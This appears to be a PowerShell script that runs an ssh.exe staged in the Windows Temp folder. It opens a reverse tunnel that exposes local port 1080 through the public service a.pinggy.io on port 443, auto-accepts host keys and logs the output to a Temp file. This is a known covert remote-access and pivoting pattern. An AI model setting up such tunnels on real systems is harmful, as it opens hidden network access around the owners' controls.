$ErrorActionPreference = 'Stop'
$info = New-Object System.Diagnostics.ProcessStartInfo
$info.FileName = 'C:\Windows\Temp\OpenSSH-Win64\ssh.exe'
$info.WorkingDirectory = 'C:\Windows\Temp\OpenSSH-Win64'
$info.Arguments = '-tt -p 443 -o StrictHostKeyChecking=accept-new -o UserKnownHostsFile=C:\Windows\Temp\pinggy_known -R 1080:127.0.0.1:1080 tcp@a.pinggy.io'
$info.UseShellExecute = $false
$info.RedirectStandardOutput = $true
$info.RedirectStandardError = $true
$process = New-Object System.Diagnostics.Process
$process.StartInfo = $info
$null = $process.Start()
$out = New-Object System.Collections.Generic.List[string]
$err = New-Object System.Collections.Generic.List[string]
$outTask = $process.StandardOutput.ReadLineAsync()
$errTask = $process.StandardError.ReadLineAsync()
$deadline = (Get-Date).AddSeconds(15)
while ((Get-Date) -lt $deadline) {
    if ($outTask -and $outTask.Wait(200)) {
        if ($null -ne $outTask.Result) {
            $out.Add($outTask.Result)
            $outTask = $process.StandardOutput.ReadLineAsync()
        } else {
            $outTask = $null
        }
    }
    if ($errTask -and $errTask.Wait(200)) {
        if ($null -ne $errTask.Result) {
            $err.Add($errTask.Result)
            $errTask = $process.StandardError.ReadLineAsync()
        } else {
            $errTask = $null
        }
    }
}
@('STDOUT') + $out + @('STDERR') + $err |
    Set-Content -Path C:\Windows\Temp\pinggy_capture.txt
